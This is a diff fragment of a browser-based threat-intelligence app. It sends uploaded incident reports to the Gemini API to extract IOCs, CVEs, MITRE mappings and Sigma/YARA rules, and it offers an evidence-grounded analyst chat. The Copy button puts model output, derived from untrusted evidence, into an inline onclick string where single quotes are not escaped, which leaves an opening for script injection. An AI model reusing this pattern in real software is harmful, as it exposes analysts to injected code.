+                    <p class="text-xs text-slate-400">This abstract view maps relationships extracted from evidence. In a full system, this would be an interactive force-directed canvas.</p>
+                </div>
+            `;
+        }
+
+        function renderRules() {
+            const container = document.getElementById('rulesContent');
+            if (state.rules.length === 0) {
+                container.innerHTML = createEmptyState("No detection rules generated yet.");
+                return;
+            }
+            container.innerHTML = `
+                <div class="grid gap-6">
+                    ${state.rules.map((rule, idx) => `
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden shadow-xl">
+                            <div class="bg-slate-950 px-4 py-3 border-b border-slate-800 flex items-center justify-between">
+                                <div class="flex items-center gap-3">
+                                    <span class="px-2 py-0.5 bg-orange-500/20 text-orange-400 border border-orange-500/30 rounded text-xs font-bold uppercase">
+                                        ${escapeHtml(rule.type)}
+                                    </span>
+                                    <h3 class="font-semibold text-slate-200 text-sm">${escapeHtml(rule.name)}</h3>
+                                </div>
+                                <button onclick="copyToClipboard(decodeURIComponent('${encodeURIComponent(rule.content)}'))" class="text-slate-500 hover:text-slate-300 flex items-center gap-1 text-xs transition-colors">
+                                    <i data-lucide="copy" class="w-3.5 h-3.5"></i> Copy
+                                </button>
+                            </div>
+                            <div class="p-4 overflow-x-auto custom-scrollbar">
+                                <pre class="text-sm font-mono text-slate-300 whitespace-pre">${escapeHtml(rule.content)}</pre>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function renderCves() {
+            const container = document.getElementById('cvesContent');
+            if (state.cves.length === 0) {
+                container.innerHTML = createEmptyState("No CVEs detected in the uploaded sources.");
+                return;
+            }
+            container.innerHTML = `
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                    ${state.cves.map(cve => {
+                        const p = cve.priority?.toLowerCase();
+                        const priorityClass = p === 'critical' ? 'bg-red-500 text-white' : p === 'high' ? 'bg-orange-500 text-white' : 'bg-yellow-500 text-slate-900';
+                        return `
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg p-5 shadow-sm hover:shadow-md transition-shadow">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold font-mono text-red-400">${escapeHtml(cve.id)}</h3>
+                                <span class="text-[10px] px-2 py-1 rounded font-bold uppercase ${priorityClass}">
+                                    ${escapeHtml(cve.priority)}
+                                </span>
+                            </div>
+                            <div class="space-y-3 text-sm">
+                                <div class="flex items-start justify-between border-b border-slate-800 pb-2">
+                                    <span class="text-slate-500">Context Status</span>
+                                    <span class="text-slate-300 text-right">${escapeHtml(cve.status)}</span>
+                                </div>
+                                <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+                                    <span class="text-slate-500">CISA KEV Status</span>
+                                    ${cve.inKEV 
+                                        ? `<span class="flex items-center gap-1 text-red-400 font-semibold text-xs"><i data-lucide="check-circle-2" class="w-3.5 h-3.5"></i> Known Exploited</span>`
+                                        : `<span class="text-slate-400 text-xs">Not in KEV</span>`
+                                    }
+                                </div>
+                                <div class="flex items-center justify-between">
+                                    <span class="text-slate-500">Exploited in Wild</span>
+                                    <span class="${cve.exploited ? 'text-red-400 font-semibold text-xs' : 'text-slate-400 text-xs'}">
+                                        ${cve.exploited ? 'YES' : 'NO / UNKNOWN'}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        `;
+                    }).join('')}
+                </div>
+            `;
+        }
+
+        // --- Action Handlers ---
+        function setActiveTab(tabId) {
+            state.activeTab = tabId;
+            renderApp();
+        }
+
+        function removeSource(id) {
+            state.sources = state.sources.filter(s => s.id !== id);
+            renderApp();
+        }
+
+        function loadDemoData() {
+            state.sources = [{ id: 1, name: 'Incident_9921_Sandbox_Report.txt', content: DEMO_REPORT }];
+            handleAnalyze();
+        }
+
+        async function handleAnalyze() {
+            if (state.sources.length === 0) return;
+            
+            state.isProcessing = true;
+            document.getElementById('analysisError').classList.add('hidden');
+            state.activeTab = 'summary'; // Auto switch to summary
+            renderApp();
+            
+            const combinedContent = state.sources.map(s => `--- SOURCE: ${s.name} ---\n${s.content}\n`).join('\n');
+            const regexIocs = extractRegexIocs(combinedContent);
+
+            const prompt = `
+                You are an expert Cyber Threat Intelligence AI. Analyze the following cybersecurity materials.
+                Generate an analyst summary of the threat, construct a chronological incident timeline,
+                extract Indicators of Compromise (IOCs), map behaviors to MITRE ATT&CK, build an investigation entity-relationship graph, 
+                extract and evaluate CVEs. Extract CVEs mentioned in the evidence. Do not guess CISA KEV status. If verified KEV data is not available in the source material, set inKEV to false and status to "Unverified". Generate detection rules (Sigma/YARA) for the malicious behaviors found.
+                
+                MATERIALS TO ANALYZE:
+                ${combinedContent}
+            `;
+
+            try {
+                const payload = {
+                    contents: [{ parts: [{ text: prompt }] }],
+                    generationConfig: {
+                        responseMimeType: "application/json",
+                        responseSchema: EXTRACTION_SCHEMA
+                    }
+                };
+
+                const result = await callGeminiAPI(payload);
+                const textResponse = result.candidates?.[0]?.content?.parts?.[0]?.text;
+                
+                if (textResponse) {
+                    const parsed = JSON.parse(textResponse);
+                    
+                    const combinedIocs = [...regexIocs];
+                    const regexValues = new Set(regexIocs.map(r => r.value));
+                    for (const llmIoc of (parsed.iocs || [])) {
+                        if (!regexValues.has(llmIoc.value)) {
+                            combinedIocs.push(llmIoc);
+                        }
+                    }
+
+                    state.summary = parsed.summary || null;
+                    state.timeline = parsed.timeline || [];
+                    state.iocs = combinedIocs;
+                    state.mitre = parsed.mitreMappings || [];
+                    state.graphData = parsed.graph || [];
+                    state.cves = parsed.cves || [];
+                    state.rules = parsed.rules || [];
+                }
+            } catch (err) {
+                console.error("Analysis Error:", err);
+                const errEl = document.getElementById('analysisError');
+                errEl.textContent = err.message.includes("API Key") ? err.message : "Failed to analyze sources. Check network or API availability.";
+                errEl.classList.remove('hidden');
+            } finally {
+                state.isProcessing = false;
+                renderApp();
+            }
+        }
+
+        async function handleChat(e) {
+            e.preventDefault();
+            const inputEl = document.getElementById('chatInput');
+            const userMessage = inputEl.value;
+            if (!userMessage.trim()) return;
+
+            inputEl.value = '';
+            // Add the user message to the UI instantly
+            state.chatHistory.push({ role: 'user', text: userMessage });
+            state.isChatLoading = true;
+            renderChatHistory();
+
+            const contextContent = state.sources.map(s => `--- ${s.name} ---\n${s.content}\n`).join('\n');
+            const systemPrompt = `You are a cybersecurity expert assistant for a SOC/DFIR analyst. 
+            Base your answers ONLY on the provided SOURCE MATERIALS. If the materials don't contain the answer, say so. 
+            Be concise, technical, and analytical.
+            
+            SOURCE MATERIALS:
+            ${contextContent}`;
+
+            try {
+                const payload = {
+                    systemInstruction: { parts: [{ text: systemPrompt }] },
+                    // Map the current history (which already includes the user's latest message) directly into contents
+                    contents: state.chatHistory.filter(m => m.role !== 'system').map(m => ({
+                        role: m.role,
+                        parts: [{ text: m.text }]
+                    }))
+                };
+
+                const result = await callGeminiAPI(payload);
+                const reply = result.candidates?.[0]?.content?.parts?.[0]?.text;
+                state.chatHistory.push({ role: 'model', text: reply || "I couldn't process that response." });
+            } catch (err) {
+                const errorMsg = err.message.includes("API Key") ? err.message : "Error: Unable to connect to AI service.";
+                state.chatHistory.push({ role: 'model', text: errorMsg });
+            } finally {
+                state.isChatLoading = false;
+                renderChatHistory();
+                lucide.createIcons();
+            }
+        }
+
+        // --- Utility ---
+        function escapeHtml(unsafe) {
+            if (!unsafe) return '';
+            return String(unsafe)
+                 .replace(/&/g, "&amp;")
+                 .replace(/</g, "&lt;")
+                 .replace(/>/g, "&gt;")
+                 .replace(/"/g, "&quot;")
+                 .replace(/'/g, "&#039;");
+        }
+
+        // --- Setup Event Listeners ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // File Uploads
+            const fileInput = document.getElementById('fileInput');
+            const openFilePicker = () => fileInput.click();
+            document.getElementById('addFileBtn').addEventListener('click', openFilePicker);
+            document.getElementById('uploadFilesBtn').addEventListener('click', openFilePicker);
+            
+            fileInput.addEventListener('change', (e) => {
+                const files = Array.from(e.target.files);
+                if (!files.length) return;
+
+                files.forEach(file => {
+                    const reader = new FileReader();
+                    reader.onload = (event) => {
+                        state.sources.push({ 
+                            id: Date.now() + Math.random(), 
+                            name: file.name, 
+                            content: event.target.result 
+                        });
+                        renderApp();
+                    };
+                    reader.readAsText(file);
+                });
+                fileInput.value = ''; // Reset
+            });
+
+            // Demo & Analyze buttons
+            document.getElementById('loadDemoBtn').addEventListener('click', loadDemoData);
+            document.getElementById('analyzeBtn').addEventListener('click', () => handleAnalyze());
+
+            // Chat Form
+            document.getElementById('chatForm').addEventListener('submit', handleChat);
+            document.getElementById('chatInput').addEventListener('input', renderChatHistory); // To handle button enable/disable
+
+            // Initial Render
+            renderApp();
+        });
+    </script>
+</body>
+</html>
